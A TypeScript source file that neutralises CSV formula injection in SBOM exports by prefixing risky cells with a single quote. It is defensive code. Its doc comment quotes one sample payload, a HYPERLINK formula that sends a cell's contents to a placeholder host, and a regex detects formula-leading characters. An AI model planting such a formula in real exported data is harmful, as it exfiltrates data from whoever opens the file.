/**
 * CSV cells for values an SBOM supplied. Every CSV export goes through
 * `csvCell`, because a spreadsheet that opens the file reads a cell starting
 * with = + - or @ as a formula (OWASP "CSV Injection"): a package name like
 * `=HYPERLINK("http://example.org/?"&A1,"click")` would run when the export
 * is opened. Such a cell gets a leading single quote, which makes it text.
 * The same holds for a leading tab, CR or LF, which spreadsheets may skip,
 * and for the full-width forms of the four characters.
 *
 * npm scopes (`@types/node`) are names and stay as they are. Their pattern
 * leaves no room for a parenthesis, a pipe or a sheet reference, so no
 * function call, DDE link or external reference fits in one.
 */

const FORMULA_START = /^[=+\-@\t\r\n＝＋－＠]/;
const NPM_SCOPED_NAME = /^@[a-z0-9][\w.-]*\/[\w.-]+$/i;
/** Comma and semicolon (the list separator of many locales), tab, quotes, line breaks. */
const NEEDS_QUOTES = /[",;\t\n\r]/;

export function csvCell(value: string): string {
  const text = FORMULA_START.test(value) && !NPM_SCOPED_NAME.test(value) ? `'${value}` : value;
  return NEEDS_QUOTES.test(text) ? `"${text.replaceAll('"', '""')}"` : text;
}
